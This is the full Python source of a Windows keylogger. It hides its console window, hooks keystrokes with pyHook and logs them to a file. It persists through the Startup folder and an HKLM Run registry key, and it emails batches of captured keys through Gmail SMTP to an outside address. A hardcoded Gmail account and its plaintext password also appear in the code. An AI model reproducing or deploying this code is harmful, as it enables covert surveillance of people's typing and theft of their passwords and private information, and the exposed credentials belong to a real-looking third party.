import pythoncom, pyHook, sys, logging, time, smtplib, win32console, win32gui, os, datetime, sys, shutil
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)
user = 'getzahia@gmail.com'
password = 'thel33tbomberpengu'
receiver = 'getzahia@hotmail.com'
try:
     smtpserver=smtplib.SMTP("smtp.gmail.com",587)
     smtpserver.ehlo()
     smtpserver.starttls()
     smtpserver.ehlo
     smtpserver.login(user, password)
     numtowait = 200
     numtowaitfirst = numtowait
except:
     pass
LOG_FILENAME = 'C:\\test.txt'
cond1 = 'n'

if os.path.exists(os.getenv("USERPROFILE") + '\\Start Menu\\Programs\\Startup'):
     placetocopy = os.getenv("USERPROFILE") + '\\Start Menu\\Programs\\Startup'
else:
     placetocopy = os.getenv("USERPROFILE") + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
     
if not os.path.exists(placetocopy + '\\' + sys.argv[0]):
     shutil.copy(sys.argv[0], placetocopy)
if not os.path.exists("C:\\" + sys.argv[0]):
     shutil.copy(sys.argv[0], 'C:\\')
     os.system('REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Keyloggerfile /d "'+ sys.argv[0]+ '"')
     
if os.path.exists('C:\\test.txt'):
        fileopen = open('C:\\test.txt')
        message = ''
        for x in fileopen:
                x = x[:1]
                message += x
        date = datetime.datetime.now().strftime( "%d/%m/%Y %H:%M" )
        msg = "From: %s\nTo: %s\nSubject: %s\nDate: %s\n\n%s"  % (user, receiver, date, date, message)
        try:
             smtpserver.sendmail(user,receiver,msg)
        except:
             pass
        f = open('C:\\test.txt', 'w')
        f.close
     

def OnKeyboardEvent(event):
     global numtowait, cond1
     if numtowait != 0:
          logging.basicConfig(filename=LOG_FILENAME,level=logging.DEBUG,format='%(message)s')
          logging.log(10,chr(event.Ascii))
          numtowait = numtowait - 1
          return True
     
          
     else:
          numtowait = numtowaitfirst
          fileopen = open('C:\\test.txt')
          message = ''
          for x in fileopen:
               x = x[:1]
               message += x
          date = datetime.datetime.now().strftime( "%d/%m/%Y %H:%M" )
          msg = "From: %s\nTo: %s\nSubject: %s\nDate: %s\n\n%s"  % (user, receiver, date, date, message)
          try:
                  smtpserver.sendmail(user,receiver,msg)
          except:
                  pass
          cond1 = 'y'
          return True
          f = open('C:\\test.txt', 'w')
          f.close
          time.sleep(3)


          

hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()

          







